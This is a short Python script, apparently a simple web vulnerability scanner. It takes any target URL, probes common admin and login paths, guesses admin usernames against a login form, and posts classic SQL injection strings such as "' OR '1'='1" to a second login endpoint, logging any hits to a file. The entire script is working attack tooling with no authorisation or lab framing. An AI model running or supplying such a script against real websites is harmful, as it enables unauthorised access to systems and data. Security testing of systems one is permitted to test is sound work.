import requests

base_url = input("Enter target URL: ")

print("\n[INFO] Scanning started...\n")

results = []

# 🔍 Directory check
def scan_directories():
    paths = ["admin", "login", "dashboard", "secret"]

    for path in paths:
        url = f"{base_url}/{path}"
        response = requests.get(url)

        if response.status_code == 200:
            result = f"[FOUND] {url}"
            print(result)
            results.append(result)

# 🔐 Auth bypass test
def test_auth_bypass():
    url = f"{base_url}/login"
    payloads = ["admin", "admin123", "testadmin"]

    for payload in payloads:
        data = {"username": payload, "password": "test"}
        response = requests.post(url, data=data)

        if "Welcome admin" in response.text:
            result = f"[VULNERABLE] Auth bypass → {payload}"
            print(result)
            results.append(result)

# 💉 SQL Injection test
def test_sql_injection():
    url = f"{base_url}/login2"
    payloads = ["' OR '1'='1", "' OR 1=1 --"]

    for payload in payloads:
        data = {"username": payload, "password": "test"}
        response = requests.post(url, data=data)

        if "Logged in" in response.text:
            result = f"[SQL VULNERABLE] Payload → {payload}"
            print(result)
            results.append(result)

# Run all
scan_directories()
test_auth_bypass()
test_sql_injection()

# Save results
with open("vuln_results.txt", "w", encoding="utf-8") as f:
    for r in results:
        f.write(r + "\n")

print("\n[INFO] Scan completed. Results saved.")